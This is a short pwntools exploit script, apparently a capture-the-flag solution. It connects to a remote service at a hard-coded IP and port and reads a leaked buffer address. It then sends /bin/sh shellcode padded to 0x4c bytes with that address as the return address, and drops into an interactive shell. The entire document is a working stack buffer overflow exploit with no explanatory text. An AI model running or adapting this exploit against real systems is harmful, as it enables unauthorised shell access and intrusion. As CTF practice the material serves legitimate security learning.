from pwn import *

#sh=process('./pwn')
sh=remote('106.75.95.47',42264)
shellcode = asm(shellcraft.sh())
sh.recvuntil('gift->')
buf2_addr=int(sh.recv(10),16)
print hex(buf2_addr)
sh.sendlineafter('to do?',shellcode.ljust(0x4c, 'A') + p32(buf2_addr))
sh.interactive()
